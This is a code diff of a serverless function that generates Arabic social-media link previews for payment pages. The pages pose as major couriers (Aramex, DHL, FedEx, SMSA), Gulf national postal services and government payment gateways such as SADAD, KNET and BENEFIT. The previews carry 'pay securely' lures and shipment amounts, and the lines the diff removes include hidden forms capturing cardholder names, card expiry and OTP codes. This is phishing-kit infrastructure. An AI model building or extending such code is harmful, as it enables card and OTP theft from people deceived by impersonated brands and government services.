@@ -1,98 +1,162 @@
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
-const http = require('http');
+const { createClient } = require('@supabase/supabase-js');
 
-// Service data mapping - matches the serviceLogos.ts file
+// Updated Service data mapping - matches src/lib/serviceLogos.ts
 const serviceData = {
   aramex: {
     name: "أرامكس - Aramex",
-    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
+    description: "أكمل عملية الدفع بأمان تام لشحنة أرامكس. منصة الدفع الموثوقة لخدمات الشحن السريع والحلول اللوجستية.",
     ogImage: "/og-aramex.jpg"
   },
   dhl: {
     name: "دي إتش إل - DHL", 
-    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
-    ogImage: "/og-dhl.jpg"
-  },
-  dhlkw: {
-    name: "دي إتش إل - DHL الكويت", 
-    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
-    ogImage: "/og-dhl.jpg"
-  },
-  dhlqa: {
-    name: "دي إتش إل - DHL قطر", 
-    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
-    ogImage: "/og-dhl.jpg"
-  },
-  dhlom: {
-    name: "دي إتش إل - DHL عُمان", 
-    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
-    ogImage: "/og-dhl.jpg"
-  },
-  dhlbh: {
-    name: "دي إتش إل - DHL البحرين", 
-    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+    description: "سدد رسوم شحنة DHL الخاصة بك بأمان. الشبكة العالمية الأكبر للشحن السريع توفر لك حلول دفع موثوقة.",
     ogImage: "/og-dhl.jpg"
   },
   fedex: {
     name: "فيديكس - FedEx",
-    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
+    description: "ادفع بأمان لشحنات فيديكس الدولية. رائدة الشحن الدولي توفر لك نظام دفع مشفر لضمان وصول شحنتك.",
     ogImage: "/og-fedex.jpg"
   },
   ups: {
     name: "يو بي إس - UPS",
-    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
+    description: "أكمل دفع شحنة UPS الخاصة بك عبر بوابتنا الآمنة. حلول لوجستية متكاملة وخدمات شحن عالمية احترافية.",
     ogImage: "/og-ups.jpg"
   },
   empost: {
     name: "البريد الإماراتي - Emirates Post",
-    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
+    description: "سدد رسوم البريد الإماراتي الرسمي بأمان. خدمات بريدية وشحن متميزة محلياً ودولياً.",
     ogImage: "/og-empost.jpg"
   },
   smsa: {
     name: "سمسا - SMSA",
-    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
+    description: "أكمل دفع شحنة سمسا الخاصة بك بأمان. الرائدة في الشحن السعودي توفر لك خدمات توصيل سريعة وموثوقة.",
     ogImage: "/og-smsa.jpg"
   },
   zajil: {
     name: "زاجل - Zajil",
-    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
+    description: "ادفع بأمان لشحنة زاجل. شحن سريع وموثوق داخل المملكة العربية السعودية مع تغطية شاملة لكافة المناطق.",
     ogImage: "/og-zajil.jpg"
   },
   naqel: {
     name: "ناقل - Naqel", 
-    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
+    description: "سدد رسوم شحنة ناقل إكسبريس بأمان. خدمات شحن متطورة وحلول لوجستية ذكية لضمان وصول شحنتك بسرعة.",
     ogImage: "/og-naqel.jpg"
   },
   saudipost: {
-    name: "البريد السعودي - Saudi Post",
-    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
+    name: "البريد السعودي - SPL",
+    description: "ادفع رسوم البريد السعودي (SPL) عبر نظامنا الآمن. المشغل الوطني الرسمي يقدم خدمات بريدية وشحن متطورة.",
     ogImage: "/og-saudipost.jpg"
   },
   kwpost: {
     name: "البريد الكويتي - Kuwait Post",
-    description: "المشغل الوطني للبريد في دولة الكويت",
+    description: "سدد رسوم البريد الكويتي الرسمي بأمان. خدمات بريدية وشحن محلية ودولية موثوقة.",
     ogImage: "/og-kwpost.jpg"
   },
   qpost: {
     name: "البريد القطري - Qatar Post",
-    description: "المشغل الوطني للبريد في دولة قطر",
+    description: "أكمل دفع خدمات البريد القطري بأمان. خدمات بريدية وشحن احترافية تضمن لك السرعة والأمان.",
     ogImage: "/og-qpost.jpg"
   },
   omanpost: {
     name: "البريد العُماني - Oman Post",
-    description: "المشغل الوطني للبريد في سلطنة عُمان",
+    description: "ادفع رسوم البريد العُماني الرسمي عبر بوابتنا الآمنة. خدمات بريدية وشحن موثوقة تربط سلطنة عُمان بالعالم.",
     ogImage: "/og-omanpost.jpg"
   },
   bahpost: {
     name: "البريد البحريني - Bahrain Post",
-    description: "المشغل الوطني للبريد في مملكة البحرين",
+    description: "سدد رسوم البريد البحريني بأمان. خدمات بريدية وشحن احترافية وموثوقة في مملكة البحرين.",
     ogImage: "/og-bahpost.jpg"
+  },
+  jinakum: {
+    name: "جينا كم - Jinakum",
+    description: "أكمل دفع شحنة جينا كم بأمان. حلول شحن مبتكرة وخدمات لوجستية متطورة توفر لك السرعة والموثوقية.",
+    ogImage: "/og-jinakum.jpg"
+  },
+  jinaken: {
+    name: "جيناكن - Jinaken",
+    description: "ادفع بأمان لخدمات جيناكن للشحن. شركة توصيل عُمانية متميزة تقدم خدمات لوجستية احترافية.",
+    ogImage: "/og-jinaken.jpg"
+  },
+  genacom: {
+    name: "جيناكوم - Genacom",
+    description: "سدد رسوم شحن جيناكوم بأمان. خدمات لوجستية احترافية وشحن سريع مع نظام تتبع متطور.",
+    ogImage: "/og-genacom.jpg"
+  },
+  albaraka: {
+    name: "مجموعة البركة - Al Baraka",
+    description: "أكمل عمليات الدفع لمجموعة البركة بأمان. خدمات لوجستية وحلول مالية متكاملة تلبي احتياجاتك في الخليج.",
+    ogImage: "/og-albaraka.jpg"
+  },
+  alfuttaim: {
+    name: "مجموعة الفطيم - Al Futtaim",
+    description: "سدد رسوم الفطيم للخدمات اللوجستية بأمان. حلول شحن وتوزيع عالمية احترافية مدعومة بواحدة من أكبر المجموعات.",
+    ogImage: "/og-alfuttaim.jpg"
+  },
+  alshaya: {
+    name: "مجموعة الشايع - Al Shaya",
+    description: "ادفع بأمان لخدمات الشايع اللوجستية. شبكة توزيع واسعة وحلول شحن احترافية تدعم كبرى العلامات التجارية.",
+    ogImage: "/og-alshaya.jpg"
+  },
+  shipco: {
+    name: "شيبكو - Shipco",
+    description: "أكمل دفع خدمات شيبكو بأمان. رائدة الشحن البحري والجوي والبري توفر لك حلول نقل دولية شاملة.",
+    ogImage: "/og-shipco.jpg"
+  },
+  bahri: {
+    name: "بحري - Bahri",
+    description: "سدد رسوم الشركة الوطنية للشحن (بحري) بأمان. الرائدة العالمية في النقل البحري والخدمات اللوجستية.",
+    ogImage: "/og-bahri.jpg"
+  },
+  hellmann: {
+    name: "هيلمان - Hellmann",
+    description: "ادفع بأمان لخدمات هيلمان العالمية. شبكة لوجستية دولية تقدم حلول شحن احترافية وتغطية عالمية شاملة.",
+    ogImage: "/og-hellmann.jpg"
+  },
+  dsv: {
+    name: "دي إس في - DSV",
+    description: "أكمل دفع خدمات DSV اللوجستية بأمان. شبكة عالمية توفر حلول نقل وشحن متكاملة.",
+    ogImage: "/og-dsv.jpg"
+  },
+  agility: {
+    name: "أجيليتي - Agility",
+    description: "سدد رسوم أجيليتي بأمان. رائدة حلول سلاسل الإمداد تقدم خدمات لوجستية متكاملة ومبتكرة في منطقة الخليج.",
+    ogImage: "/og-agility-temp.jpg"
+  },
+  sadad: {
+    name: "سداد - SADAD",
+    description: "بوابة دفع سداد الآمنة. سدد رسوم الجوازات، المرور، رخص القيادة، والخدمات الحكومية عبر نظام موثوق.",
+    ogImage: "/og-government_payment.jpg"
+  },
+  benefit: {
+    name: "بنفت - BENEFIT",
+    description: "بوابة دفع بنفت الآمنة. سدد رسوم الخدمات الحكومية، المخالفات، والخدمات البلدية في مملكة البحرين.",
+    ogImage: "/og-government_payment.jpg"
+  },
+  knet: {
+    name: "كي نت - KNET",
+    description: "بوابة دفع كي نت الآمنة. نظام الدفع الإلكتروني الرائد في الكويت لسداد الرسوم والخدمات الحكومية.",
+    ogImage: "/og-government_payment.jpg"
+  },
+  omannet: {
+    name: "عُمان نت - OmanNet",
+    description: "بوابة دفع عُمان نت (بطاقة مال) الآمنة. سدد رسوم الجوازات، المخالفات والخدمات البلدية في سلطنة عُمان.",
+    ogImage: "/og-government_payment.jpg"
+  },
+  jaywan: {
+    name: "جيوان - Jaywan",
+    description: "بوابة دفع جيوان الآمنة. نظام البطاقة الوطنية الإماراتي لسداد رسوم الهوية والخدمات الحكومية.",
+    ogImage: "/og-government_payment.jpg"
+  },
+  "qatar-gov": {
+    name: "بوابة الدفع القطرية",
+    description: "سدد رسوم الخدمات الحكومية القطرية بأمان. بوابة موحدة لدفع رسوم الجوازات، الهوية، والمخالفات.",
+    ogImage: "/og-government_payment.jpg"
   }
 };
 
-// Country data mapping
+// Country data mapping - matches src/utils/countryData.ts
 const countryData = {
   AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
   SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
@@ -103,384 +167,166 @@ const countryData = {
 };
 
 // Supabase configuration
-const { createClient } = require('@supabase/supabase-js');
-
 const supabaseUrl = process.env.VITE_SUPABASE_URL;
 const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;
-
 const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;
 
 // Function to get link data from database
 async function getLinkData(linkId) {
-  if (!supabase) {
-    console.log('Supabase not configured, using fallback data');
-    return null;
-  }
-  
+  if (!supabase) return null;
   try {
     const { data, error } = await supabase
       .from('links')
       .select('*')
       .eq('id', linkId)
       .single();
-    
-    if (error) {
-      console.error('Error fetching link data:', error);
-      return null;
-    }
-    
+    if (error) return null;
     return data;
   } catch (error) {
-    console.error('Error in getLinkData:', error);
     return null;
   }
 }
 
 exports.handler = async (event, context) => {
-  // Wrap everything in try-catch to ensure we always return HTML
-  // Never show Netlify login or error pages
+  // Use a variable to store the final HTML to avoid duplication in catch block
+  let finalHtml = '';
+
   try {
-    const { path, queryStringParameters, headers } = event;
+    const { path: requestPath, queryStringParameters, headers } = event;
+    const siteUrl = `https://${headers.host}`;
     
-    // Detect if this is a social media crawler or bot
-    const userAgent = headers['user-agent'] || headers['User-Agent'] || '';
-    const isCrawler = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|slackbot|telegrambot|bingbot|googlebot|baiduspider|yandexbot|applebot/i.test(userAgent);
-    
-    // Continue with meta tag generation for both crawlers and regular users
-    // Crawlers will read meta tags, regular users will be redirected via JavaScript
-  
-  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
-  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
-  let countryCode, type, id;
-  
-  if (pathMatch) {
-    [, countryCode, type, id] = pathMatch;
-  } else {
-    // Handle payment page routes: /pay/:id/...
-    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
-    if (pathMatch) {
-      [, id, subPath] = pathMatch;
-      // For payment pages, we need to determine the type from the link data
-      type = 'shipping'; // Default to shipping for payment pages
-      countryCode = 'SA'; // Default country, will be overridden by link data
-    } else {
-      // Invalid path - serve React app HTML directly without redirects
-      return {
-        statusCode: 200,
-        headers: {
-          'Content-Type': 'text/html; charset=utf-8',
-        },
-        body: `<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Loading...</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
-    <script>
-      // Update browser history for React Router
-      if (window.history && window.history.replaceState) {
-        window.history.replaceState({}, '', window.location.pathname + window.location.search);
+    // Route matching
+    let countryCode, type, id;
+    let rMatch = requestPath.match(/^\/r\/([A-Z]{2})\/([a-z-]+)\/([a-zA-Z0-9-]+)$/);
+    let pMatch = requestPath.match(/^\/p\/([a-zA-Z0-9-]+)/);
+    let payMatch = requestPath.match(/^\/pay\/([a-zA-Z0-9-]+)/);
+
+    if (rMatch) {
+      [, countryCode, type, id] = rMatch;
+    } else if (pMatch) {
+      [, id] = pMatch;
+    } else if (payMatch) {
+      [, id] = payMatch;
+    }
+
+    if (id) {
+      const linkData = await getLinkData(id);
+      if (linkData) {
+        countryCode = linkData.country_code || countryCode;
+        type = linkData.type || type;
       }
-    </script>
-  </body>
-</html>`
-      };
-    }
-  }
-  
-  // If country not found, use default but don't return 404
-  let country = countryData[countryCode];
-  if (!country) {
-    console.warn(`Country ${countryCode} not found, using default`);
-    // Use default country (Saudi Arabia)
-    country = countryData['SA'] || { nameAr: 'السعودية', name: 'Saudi Arabia' };
-    countryCode = 'SA';
-  }
-  
-  // Try to get link data from database first
-  const linkData = await getLinkData(id);
-  console.log('Retrieved link data:', JSON.stringify(linkData, null, 2));
 
-  // For payment pages, get country and type from link data if available
-  if (linkData?.country_code) {
-    countryCode = linkData.country_code;
-    const linkCountry = countryData[countryCode];
-    if (linkCountry) {
-      country = linkCountry;
-    }
-  }
-
-  if (linkData?.type) {
-    type = linkData.type;
-  }
-  
-  // Debug logging
-  console.log('Link ID:', id);
-  console.log('Link Data:', linkData);
-  console.log('Query Parameters:', queryStringParameters);
-  console.log('Final Country:', countryCode, 'Type:', type);
-  
-  let title = "";
-  let description = "";
-  let ogImage = "/og-aramex.jpg";
-  let serviceKey = 'aramex'; // fallback
-  
-  if (type === "shipping") {
-    // Determine service key from multiple sources - prioritize 'company' parameter
-    if (queryStringParameters?.company) {
-      serviceKey = queryStringParameters.company;
-      console.log('Using company parameter:', serviceKey);
-    } else if (linkData?.payload?.service_key) {
-      serviceKey = linkData.payload.service_key;
-      console.log('Using service_key from payload:', serviceKey);
-    } else if (linkData?.payload?.service) {
-      serviceKey = linkData.payload.service;
-      console.log('Using service from payload:', serviceKey);
-    } else if (queryStringParameters?.service) {
-      serviceKey = queryStringParameters.service;
-      console.log('Using service from query params:', serviceKey);
-    } else {
-      console.log('Using fallback service:', serviceKey);
-    }
-
-    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
-    
-    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
-    
-    // Determine if this is a payment page or microsite
-    const isPaymentPage = path.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
-    
-    title = `${pageType} - ${serviceName}`;
-    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
-    ogImage = serviceInfo.ogImage;
-    
-    // Add tracking number to description if available
-    if (linkData?.payload?.tracking_number) {
-      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
-    }
-    
-    // Add COD amount if available
-    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
-      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
-    }
-  } else if (type === "chalet") {
-    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
-    const isPaymentPage = path.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
-    
-    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
-    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
-    
-    // Add guest count and nights if available
-    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
-      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
-    }
-    
-    ogImage = "/og-aramex.jpg"; // Default for chalets
-  }
-  
-  const siteUrl = `https://${event.headers.host}`;
-  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
-  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
-  const secureOgImage = fullOgImage.replace('http://', 'https://');
-  
-  // Final debug logging
-  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
-  
-  // Build HTML with React app - use current build's asset filenames
-  // In Netlify, the dist folder is accessible, so we can read index.html
-  // But if that fails, we'll use a script that loads assets dynamically
-  let scriptTag = '';
-  let styleTag = '';
-  
-  try {
-    // Try to read index.html from dist folder
-    // In Netlify functions, the dist folder is at the repo root
-    const indexPath = path.join(__dirname, '..', '..', 'dist', 'index.html');
-    if (fs.existsSync(indexPath)) {
-      const baseHtml = fs.readFileSync(indexPath, 'utf8');
+      countryCode = countryCode || 'SA';
+      type = type || 'shipping';
+      const country = countryData[countryCode.toUpperCase()] || countryData.SA;
       
-      // Extract script and style tags
-      const scriptMatch = baseHtml.match(/<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/i);
-      const styleMatch = baseHtml.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/i);
-      
-      if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
-      if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
-      
-      console.log('Successfully loaded assets from index.html');
-    } else {
-      throw new Error('index.html not found at expected path');
-    }
-  } catch (error) {
-    console.error('Could not read index.html:', error);
-    // Fallback: Use current build's asset filenames
-    // Updated: 2025-11-09
-    scriptTag = '<script type="module" crossorigin src="/assets/index-DzQfBceo.js"></script>';
-    styleTag = '<link rel="stylesheet" crossorigin href="/assets/index-B4xNSA_N.css">';
+      let serviceKey = 'aramex';
+      if (queryStringParameters?.company) {
+        serviceKey = queryStringParameters.company;
+      } else if (linkData?.payload?.service_key) {
+        serviceKey = linkData.payload.service_key;
+      }
 
-    // If those don't work, add a fallback script that tries multiple patterns
-    scriptTag += `
-    <script>
-      // Fallback: Try to load React app if primary script fails
-      window.addEventListener('error', function(e) {
-        if (e.target && e.target.tagName === 'SCRIPT') {
-          // Try alternative asset paths
-          const alternatives = ['/assets/index.js', '/assets/index-main.js'];
-          alternatives.forEach(alt => {
-            const script = document.createElement('script');
-            script.type = 'module';
-            script.src = alt;
-            document.head.appendChild(script);
-          });
+      const service = serviceData[serviceKey.toLowerCase()] || serviceData.aramex;
+      let title = `${service.name} | دفع آمن - ${country.nameAr}`;
+      let description = service.description;
+      let ogImage = service.ogImage;
+
+      if (type === 'chalet') {
+        const chaletName = linkData?.payload?.chalet_name || 'شاليه';
+        title = `حجز ${chaletName} | دفع آمن - ${country.nameAr}`;
+      } else if (type === 'invoices') {
+        title = `فاتورة إلكترونية | دفع آمن - ${country.nameAr}`;
+      }
+
+      const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+      const secureOgImage = fullOgImage.replace('http://', 'https://');
+      const fullUrl = `${siteUrl}${requestPath}`;
+
+      // Dynamic Asset Discovery
+      let scriptTag = '<script type="module" crossorigin src="/assets/index.js"></script>';
+      let styleTag = '<link rel="stylesheet" crossorigin href="/assets/index.css">';
+
+      try {
+        const possiblePaths = [
+          path.join(__dirname, 'dist/index.html'),
+          path.join(__dirname, 'index.html'),
+          path.join(__dirname, '../../dist/index.html'),
+          path.join(process.cwd(), 'dist/index.html')
+        ];
+
+        let indexHtml = null;
+        for (const p of possiblePaths) {
+          if (fs.existsSync(p)) {
+            indexHtml = fs.readFileSync(p, 'utf8');
+            break;
+          }
         }
-      }, true);
-    </script>`;
-  }
-  
-  // Build the React app HTML with proper meta tags and asset loading
-  // This HTML will be served directly - no redirects, no Netlify login pages
-  const reactAppHtml = `<!doctype html>
-<html lang="en">
+
+        if (indexHtml) {
+          const scriptMatch = indexHtml.match(/<script[^>]*src=["']([^"']+\/assets\/index-[^"']+\.js)["'][^>]*>/);
+          const styleMatch = indexHtml.match(/<link[^>]*href=["']([^"']+\/assets\/index-[^"']+\.css)["'][^>]*>/);
+          if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
+          if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
+        }
+      } catch (e) {}
+
+      finalHtml = `<!doctype html>
+<html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="theme-color" content="#0EA5E9" />
-    <link rel="manifest" href="/manifest.json" />
-    <link rel="apple-touch-icon" href="/icon-192.png" />
-    <!-- Primary Meta Tags -->
     <title>${title}</title>
-    <meta name="title" content="${title.replace(/"/g, '&quot;')}" />
-    <meta name="description" content="${description.replace(/"/g, '&quot;')}" />
-    <meta name="author" content="منصة الدفع الذكية" />
+    <meta name="description" content="${description}" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="${title}" />
+    <meta property="og:description" content="${description}" />
+    <meta property="og:image" content="${secureOgImage}" />
+    <meta property="og:url" content="${fullUrl}" />
+    <meta property="og:site_name" content="نظام الدفع الآمن" />
+    <meta property="og:locale" content="ar_AR" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="${title}" />
+    <meta name="twitter:description" content="${description}" />
+    <meta name="twitter:image" content="${secureOgImage}" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
     ${styleTag}
-    
-    <!-- Open Graph / Facebook / WhatsApp Meta Tags -->
-    <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="نظام الدفع الآمن" />
-    <meta property="og:locale" content="ar_AR" />
-    <meta property="og:url" content="${fullUrl}" />
-    <meta property="og:title" content="${title.replace(/"/g, '&quot;')}" />
-    <meta property="og:description" content="${description.replace(/"/g, '&quot;')}" />
-    <meta property="og:image" content="${secureOgImage}" />
-    <meta property="og:image:secure_url" content="${secureOgImage}" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta property="og:image:type" content="image/jpeg" />
-    <meta property="og:image:alt" content="${title.replace(/"/g, '&quot;')}" />
-    
-    <!-- Twitter Card Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:url" content="${fullUrl}" />
-    <meta name="twitter:title" content="${title.replace(/"/g, '&quot;')}" />
-    <meta name="twitter:description" content="${description.replace(/"/g, '&quot;')}" />
-    <meta name="twitter:image" content="${secureOgImage}" />
-    <meta name="twitter:image:alt" content="${title.replace(/"/g, '&quot;')}" />
-    
-    <link rel="canonical" href="${fullUrl}" />
   </head>
   <body>
     <div id="root"></div>
-    
-    <!-- Update browser history immediately so React Router sees the correct path -->
-    <script>
-      (function() {
-        const originalPath = '${path}';
-        const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
-        if (window.history && window.history.replaceState) {
-          window.history.replaceState({}, '', originalPath + query);
-        }
-      })();
-    </script>
-    
     ${scriptTag}
-    
-    <!-- Hidden Netlify Forms -->
-    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
-      <input type="text" name="name" />
-      <input type="email" name="email" />
-      <input type="tel" name="phone" />
-      <input type="text" name="service" />
-      <input type="text" name="cardholder" />
-      <input type="text" name="cardLast4" />
-      <input type="text" name="expiry" />
-      <input type="text" name="timestamp" />
-    </form>
-    
-    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
-      <input type="text" name="name" />
-      <input type="email" name="email" />
-      <input type="tel" name="phone" />
-      <input type="text" name="service" />
-      <input type="text" name="amount" />
-      <input type="text" name="cardholder" />
-      <input type="text" name="cardLast4" />
-      <input type="text" name="otp" />
-      <input type="text" name="timestamp" />
-    </form>
   </body>
 </html>`;
-  
-  // The HTML already has meta tags injected, so we can return it directly
-  const html = reactAppHtml;
 
-  return {
-    statusCode: 200,
-    headers: {
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'public, max-age=0, must-revalidate',
-      'X-Content-Type-Options': 'nosniff',
-      'X-Frame-Options': 'SAMEORIGIN'
-    },
-    body: html
-  };
+      return {
+        statusCode: 200,
+        headers: { 'Content-Type': 'text/html; charset=utf-8' },
+        body: finalHtml
+      };
+    } else {
+      throw new Error('No ID found');
+    }
   } catch (error) {
-    // If anything goes wrong, still return HTML (never show Netlify error/login page)
-    console.error('Error in microsite-meta function:', error);
-    
-    // Return React app HTML with fallback meta tags
+    // Return fallback React app HTML on error
     return {
       statusCode: 200,
-      headers: {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'public, max-age=0, must-revalidate',
-        'X-Content-Type-Options': 'nosniff',
-        'X-Frame-Options': 'SAMEORIGIN'
-      },
+      headers: { 'Content-Type': 'text/html; charset=utf-8' },
       body: `<!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="theme-color" content="#0EA5E9" />
-    <title>منصة الشحن الذكية</title>
-    <meta name="description" content="منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة" />
+    <title>نظام الدفع الآمن</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
-    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
+    <script type="module" crossorigin src="/assets/index.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index.css">
   </head>
   <body>
     <div id="root"></div>
-    <script>
-      // Update browser history for React Router
-      if (window.history && window.history.replaceState) {
-        window.history.replaceState({}, '', window.location.pathname + window.location.search);
-      }
-    </script>
   </body>
 </html>`
     };
